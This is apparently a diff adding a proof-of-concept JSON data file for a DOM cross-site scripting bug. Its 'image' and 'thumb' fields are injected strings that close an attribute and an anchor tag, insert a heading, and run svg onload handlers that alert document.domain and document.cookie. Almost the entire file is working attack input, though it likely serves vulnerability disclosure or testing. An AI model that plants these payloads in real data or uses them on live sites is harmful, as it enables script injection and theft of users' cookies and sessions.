@@ -1,0 +1,7 @@
+[
+{
+  "folder": "POC",
+  "image": "x\"></a><h1>image Dom XSS image</h1><svg onload=alert(document.domain)>",
+  "thumb": "x\"></a><h1>thumb Dom XSS thumb </h1><svg onload=alert(document.cookie)>"
+}
+]
